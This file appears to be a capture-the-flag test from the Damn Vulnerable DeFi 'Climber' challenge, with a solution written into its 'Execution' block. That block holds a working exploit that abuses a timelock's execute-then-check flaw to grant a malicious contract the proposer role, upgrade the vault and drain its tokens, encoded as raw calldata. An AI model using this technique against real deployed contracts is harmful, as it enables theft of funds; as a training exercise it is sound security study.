const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, player;
    let timelock, vault, token;

    const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TIMELOCK_DELAY = 60 * 60;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await vault.getSweeper()).to.eq(sweeper.address);
        expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
        expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await vault.owner();
        timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock delay is correct and cannot be changed
        expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
        await expect(timelock.updateDelay(TIMELOCK_DELAY + 1)).to.be.revertedWithCustomError(timelock, 'CallerNotTimelock');
        
        // Ensure timelock roles are correctly initialized
        expect(
            await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        /**
         * Attack path:
         * (1) In a single execute call:
         * - Set update time requiremnt to zero
         * - Give MaliciousProposer contract ability to make proposals
         * - Call into MaliciousProposer and have the contract propose these three actions
         * - Have MaciciousProposer make Timelock upgrade ClimberVault to vulnerable implementation
         * - Exploit the introduced vulnerability and steal funds
         */

        let maliciousClimber = await (await ethers.getContractFactory('MalicousUpgrade', deployer)).deploy();
        let maliciousProposer = await (await ethers.getContractFactory('MaliciousProposer', deployer)).deploy(player.address, timelock.address, vault.address, maliciousClimber.address, token.address);

        // create call data
        const abi = ethers.utils.defaultAbiCoder;
        let _updateDelay = ethers.utils.solidityPack(["bytes4", "bytes"], ["0x24adbc5b", abi.encode(['uint64'], [0])]);
        let _grantRole = ethers.utils.solidityPack(['bytes4', 'bytes'], ["0x2f2ff15d", abi.encode(['bytes32', 'address'], ["0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1", maliciousProposer.address])]);
        let _propose = ethers.utils.solidityPack(['bytes4'], ["0xc198f8ba"]);

        let executionData = abi.encode(
            ['address[]', 'uint256[]', 'bytes[]', 'uint256'],
            [
                [timelock.address, timelock.address, maliciousProposer.address],
                [0, 0, 0],
                [_updateDelay, _grantRole, _propose],
                0]);

        await maliciousProposer.setProposerData(executionData);

        let call = ethers.utils.solidityPack(["bytes4", "bytes"], ["0x2656227d", executionData]);

        const tx = await player.sendTransaction({
            to: timelock.address,
            data: call,
        });
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
